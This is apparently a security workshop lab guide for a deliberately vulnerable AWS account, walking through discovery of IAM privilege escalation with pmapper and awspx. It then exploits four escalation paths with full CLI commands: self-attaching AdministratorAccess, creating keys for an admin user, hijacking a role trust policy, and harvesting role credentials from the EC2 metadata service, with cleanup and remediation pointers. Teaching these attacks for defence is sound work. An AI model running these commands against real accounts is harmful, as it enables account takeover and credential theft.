# Lab 1 - Layin' Down the Law: Identifying and Exploiting IAM Misconfigurations

**Duration:** 45 minutes

## Overview

In this lab, you'll use industry-standard tools to discover and exploit privilege escalation vulnerabilities in AWS IAM. This hands-on experience demonstrates why IAM misconfigurations are consistently ranked among the top cloud security risks.

**What You'll Learn:**
- How attackers use tools like **pmapper** to automatically discover IAM vulnerabilities
- How to visualize IAM relationships using **awspx**
- The five categories of IAM privilege escalation (from pathfinding.cloud)
- How to exploit four common privilege escalation paths to understand their real-world impact

**Why This Matters:**
IAM misconfigurations are the #1 cause of cloud breaches. A single overly-permissive policy can allow an attacker to escalate from a low-privilege user to full account administrator. By understanding how attackers find and exploit these vulnerabilities, you'll be better equipped to prevent them.

---

## Prerequisites

Complete [Lab 0 - Prerequisites](../lab-0-prerequisites/lab-0-prerequisites.md) before starting. If you're at Wild West Hackin' Fest, your environment is pre-configured.

Verify your setup:
```bash
aws sts get-caller-identity
```

You should see your account ID and IAM principal.

---

## Exercise 1: Building Your IAM Intelligence

Before you can find vulnerabilities, you need visibility. In this exercise, you'll use two complementary tools:

- **pmapper** (Principal Mapper): Builds a graph of IAM principals and analyzes privilege escalation paths
- **awspx**: Visualizes IAM relationships as an interactive graph

### Understanding the Tools

| Tool | Purpose | Output |
|------|---------|--------|
| pmapper | Automated privilege escalation analysis | Text-based findings and queries |
| awspx | Visual IAM relationship mapping | Interactive graph in browser |

### Part A: Create the pmapper Graph

pmapper works by first building a "graph" of your AWS account's IAM configuration. This graph captures all users, roles, groups, and their permissions.

1. **Create the IAM graph:**
   ```bash
   pmapper graph create
   ```

   This command:
   - Enumerates all IAM users, roles, and groups
   - Retrieves all attached and inline policies
   - Analyzes trust relationships between principals
   - Takes 1-2 minutes to complete

2. **View the graph summary:**
   ```bash
   pmapper graph display
   ```

   You should see output like:
   ```
   Graph Data for Account:  115753408004
     # of Nodes:              37 (6 admins)
     # of Edges:              94
     # of Groups:             0
     # of (tracked) Policies: 46
   ```

   The "6 admins" tells you how many principals have administrative access—these are high-value targets for attackers.

### Part B: Run Privilege Escalation Analysis

Now use pmapper to automatically find privilege escalation paths:

```bash
pmapper analysis --output-type text
```

**What to look for:** Scan the output for users starting with `iamws-`. These are the intentionally vulnerable principals we'll explore:

```
* user/iamws-ci-runner-user can escalate privileges by accessing the
  administrative principal role/iamws-prod-deploy-role:
   * user/iamws-ci-runner-user can use EC2 to run an instance with an
     existing instance profile to access role/iamws-prod-deploy-role

* user/iamws-team-onboarding-user can escalate privileges by accessing
  the administrative principal user/cloud-foxable:
   * user/iamws-team-onboarding-user can create access keys to
     authenticate as user/cloud-foxable
```

**Key insight:** pmapper automatically identified that low-privilege users can reach administrative principals. An attacker with access to any of these users could compromise the entire account.

### Part C: Load Data into awspx

awspx provides a visual way to explore IAM relationships. It's already running at [http://localhost](http://localhost).

1. **Ingest AWS IAM data:**
   ```bash
   docker exec awspx python3 /opt/awspx/cli.py ingest \
     --env --services IAM --region us-east-1
   ```

   This pulls the same IAM data into awspx's graph database.

2. **Open awspx** in your browser at [http://localhost](http://localhost)

3. **Search for workshop users:** Type `iamws` in the search box to see the workshop IAM principals

You now have two powerful tools ready to explore IAM vulnerabilities.

---

## Exercise 2: AttachUserPolicy - Self-Escalation

**The Vulnerability:** The `iamws-dev-self-service-user` has permission to attach any IAM policy to any user—including themselves. This is a classic "self-escalation" vulnerability.

**Real-world scenario:** A developer account meant for self-service tasks (like managing their own MFA) is accidentally given `iam:AttachUserPolicy` without resource constraints. An attacker who compromises this account can immediately escalate to administrator.

### Part A: Identify with pmapper

First, let's confirm this user has the dangerous permission:

```bash
pmapper query "can user/iamws-dev-self-service-user do iam:AttachUserPolicy with *"
```

Expected output:
```
user/iamws-dev-self-service-user IS authorized to call action
iam:AttachUserPolicy for resource *
```

**What this means:** The user can attach ANY policy (`*`) to ANY user. The `*` wildcard is the problem—it should be constrained to specific resources.

### Part B: Understand the Attack Category

Visit [pathfinding.cloud IAM-007](https://pathfinding.cloud/paths/iam-007) to understand this attack path:

- **Category:** Self-Escalation
- **Required Permission:** `iam:AttachUserPolicy` (unrestricted)
- **Attack:** Attach `AdministratorAccess` to yourself
- **Impact:** Immediate full account access

Self-escalation attacks are the simplest privilege escalation—the attacker doesn't need to compromise another principal, they just modify their own permissions.

### Part C: Exploit the Vulnerability

Now let's prove this vulnerability is exploitable. We'll assume the vulnerable role, attach a policy, then clean up.

**Step 1: Get credentials for the vulnerable principal**
```bash
# Store the account ID
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

# Assume the vulnerable role
CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-dev-self-service-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

# Set the credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
```

**Step 2: Verify your attacker identity**
```bash
aws sts get-caller-identity
```

You should see you're now operating as the `iamws-dev-self-service-role`.

**Step 3: Attach AdministratorAccess to the user**
```bash
aws iam attach-user-policy \
  --user-name iamws-dev-self-service-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

If this succeeds with no output, the attack worked.

**Step 4: Verify the escalation**
```bash
aws iam list-attached-user-policies --user-name iamws-dev-self-service-user
```

Expected output:
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        },
        ...
    ]
}
```

**You just escalated a low-privilege user to full administrator.**

### Cleanup

Remove the attached policy before continuing:

```bash
aws iam detach-user-policy \
  --user-name iamws-dev-self-service-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Reset your credentials to your original identity
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

# Verify you're back to your original identity
aws sts get-caller-identity
```

### What You Learned

- **iam:AttachUserPolicy** with unrestricted resources (`*`) allows self-escalation
- pmapper's query language can identify principals with specific permissions
- The attack is trivial to execute once identified
- **Remediation preview:** In Lab 2, you'll apply a **permissions boundary** to prevent this attack

---

## Exercise 3: CreateAccessKey - Credential Theft

**The Vulnerability:** The `iamws-team-onboarding-user` can create access keys for any IAM user, including administrators. This allows them to generate credentials for privileged users and impersonate them.

**Real-world scenario:** An HR onboarding automation account needs to create access keys for new employees. Without proper resource constraints, it can create keys for ANY user—including the cloud admin.

### Part A: Identify with pmapper

```bash
pmapper query "who can do iam:CreateAccessKey with *"
```

Look for:
```
user/iamws-team-onboarding-user IS authorized to call action
iam:CreateAccessKey for resource *
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud IAM-002](https://pathfinding.cloud/paths/iam-002):

- **Category:** Principal Access (Credential Access)
- **Required Permission:** `iam:CreateAccessKey` (unrestricted)
- **Attack:** Create access keys for an admin user
- **Impact:** Persistent access as the admin user

Unlike self-escalation, this attack compromises a DIFFERENT principal—the attacker creates credentials to impersonate someone else.

### Part C: Exploit the Vulnerability

**Step 1: Assume the vulnerable role**
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-team-onboarding-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
```

**Step 2: Verify your attacker identity**
```bash
aws sts get-caller-identity
```

**Step 3: Create access keys for an admin user**
```bash
aws iam create-access-key --user-name cloud-foxable
```

Expected output:
```json
{
    "AccessKey": {
        "UserName": "cloud-foxable",
        "AccessKeyId": "AKIA...",
        "Status": "Active",
        "SecretAccessKey": "wJalr..."
    }
}
```

**You just created persistent credentials for an admin user.** Save the AccessKeyId for cleanup.

### Cleanup

```bash
# Delete the access key you created (replace with your actual AccessKeyId)
aws iam delete-access-key --user-name cloud-foxable --access-key-id AKIA...

# Reset credentials
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

### What You Learned

- **iam:CreateAccessKey** without resource constraints enables credential theft
- These stolen credentials provide persistent access (unlike temporary session tokens)
- **Remediation preview:** In Lab 2, you'll apply a **resource constraint** using `${aws:username}` to limit key creation to self only

---

## Exercise 4: UpdateAssumeRolePolicy - Trust Policy Hijacking

**The Vulnerability:** The `iamws-integration-admin-user` can modify the trust policy of any role. This allows them to add themselves as a trusted principal, then assume roles they weren't originally authorized to use.

**Real-world scenario:** An integration service account that manages CI/CD pipelines needs to update role trust policies for deployment. Without restrictions, it can hijack ANY role in the account.

### Part A: Identify with pmapper

```bash
pmapper query "who can do iam:UpdateAssumeRolePolicy with *"
```

Look for:
```
user/iamws-integration-admin-user IS authorized to call action
iam:UpdateAssumeRolePolicy for resource *
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud IAM-012](https://pathfinding.cloud/paths/iam-012):

- **Category:** Principal Access (Trust Policy Manipulation)
- **Required Permission:** `iam:UpdateAssumeRolePolicy` (unrestricted)
- **Attack:** Modify a role's trust policy, then assume it
- **Impact:** Access to any role in the account

This is a two-step attack: first modify who can assume the role, then assume it yourself.

### Part C: Exploit the Vulnerability

**Step 1: Assume the vulnerable role**
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-integration-admin-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
```

**Step 2: View the current trust policy of a privileged role**
```bash
aws iam get-role --role-name iamws-prod-deploy-role \
  --query 'Role.AssumeRolePolicyDocument' --output json
```

Note who is currently allowed to assume this role.

**Step 3: Update the trust policy to include our role**
```bash
aws iam update-assume-role-policy \
  --role-name iamws-prod-deploy-role \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::'$ACCOUNT_ID':role/iamws-integration-admin-role"
      },
      "Action": "sts:AssumeRole"
    }]
  }'
```

**Step 4: Assume the privileged role**
```bash
aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-prod-deploy-role \
  --role-session-name escalated
```

If this succeeds, you've successfully hijacked the production deployment role.

### Cleanup

The trust policy has been modified. The instructor will reset it, or you can reset credentials:

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

### What You Learned

- **iam:UpdateAssumeRolePolicy** is extremely powerful—it controls WHO can become a role
- Trust policies are a critical security control that's often overlooked
- **Remediation preview:** In Lab 2, you'll harden **trust policies** with explicit principal restrictions

---

## Exercise 5: PassRole + EC2 - Compute Credential Harvesting

**The Vulnerability:** The `iamws-ci-runner-user` can pass any role to an EC2 instance. By launching an instance with a privileged instance profile, they can harvest the role's credentials from the instance metadata service.

**Real-world scenario:** A CI/CD pipeline user needs to launch EC2 instances for build jobs. Without PassRole restrictions, they can launch instances with ANY role—including production admin roles.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-ci-runner-user do iam:PassRole with *"
```

Look for:
```
user/iamws-ci-runner-user IS authorized to call action iam:PassRole for resource *
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud EC2-001](https://pathfinding.cloud/paths/ec2-001):

- **Category:** New PassRole
- **Required Permissions:** `iam:PassRole` + `ec2:RunInstances` (unrestricted)
- **Attack:** Launch EC2 with privileged instance profile, harvest credentials
- **Impact:** Access to any role that has an instance profile

PassRole attacks are indirect—the attacker doesn't directly become the role, they pass it to a compute service that exposes the credentials.

### Part C: Understand the Attack Flow

We won't actually launch an EC2 instance (to avoid costs), but here's how the attack works:

**Step 1: Find privileged instance profiles**
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-ci-runner-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')

# List available instance profiles
aws iam list-instance-profiles --query 'InstanceProfiles[].{Name:InstanceProfileName,Roles:Roles[].RoleName}' --output table
```

**Step 2 (Conceptual): Launch EC2 with privileged profile**
```bash
# DO NOT RUN - for illustration only
aws ec2 run-instances \
  --image-id ami-xxxxx \
  --instance-type t2.micro \
  --iam-instance-profile Name=iamws-prod-deploy-profile
```

**Step 3 (Conceptual): Harvest credentials from instance**
```bash
# From inside the EC2 instance:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/iamws-prod-deploy-role
```

The metadata service returns temporary credentials for the attached role.

### Cleanup

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

### What You Learned

- **iam:PassRole** controls which roles can be attached to compute services
- Unrestricted PassRole + compute permissions = credential access to any role
- **Remediation preview:** In Lab 2, you'll apply **condition keys** to restrict which roles can be passed to which services

---

## Wrap-up

### What You Accomplished

In this lab, you:
1. Built an IAM graph using pmapper and identified privilege escalation paths
2. Explored IAM relationships visually with awspx
3. Exploited four distinct privilege escalation vulnerabilities:
   - **AttachUserPolicy** (Self-Escalation)
   - **CreateAccessKey** (Credential Theft)
   - **UpdateAssumeRolePolicy** (Trust Policy Hijacking)
   - **PassRole + EC2** (Compute Credential Harvesting)

### The Five Privilege Escalation Categories

From pathfinding.cloud, all IAM privilege escalation falls into five categories:

| Category | Description | Example from Lab |
|----------|-------------|------------------|
| **Self-Escalation** | Modify your own permissions | AttachUserPolicy to self |
| **Principal Access** | Access another principal's credentials | CreateAccessKey for admin |
| **New PassRole** | Pass a role to a new compute resource | PassRole to new EC2 |
| **Existing PassRole** | Modify an existing compute resource's role | (not covered) |
| **Credential Access** | Access credentials directly | (not covered) |

### Mapping to Lab 2 Remediations

| Vulnerability | Lab 2 Guardrail |
|---------------|-----------------|
| AttachUserPolicy | Permissions Boundary |
| CreateAccessKey | Resource Constraint (`${aws:username}`) |
| UpdateAssumeRolePolicy | Trust Policy Hardening |
| PassRole + EC2 | Condition Key (`iam:PassedToService`) |

---

## Next Steps

Continue to **[Lab 2 - Fencin' the Frontier](../lab-2-fencin-the-frontier/lab-2-instructions.md)** where you'll apply guardrails to prevent the attacks you just executed.

---

## Optional: Additional pmapper Queries

Explore more of pmapper's query capabilities:

```bash
# Who can become admin?
pmapper query "who can do iam:* with *"

# Can a specific user reach admin?
pmapper query "can user/iamws-ci-runner-user do s3:* with *"

# Who can pass a specific role?
pmapper query "who can do iam:PassRole with arn:aws:iam::*:role/iamws-prod-deploy-role"

# Visualize the graph (requires graphviz)
pmapper visualize
```
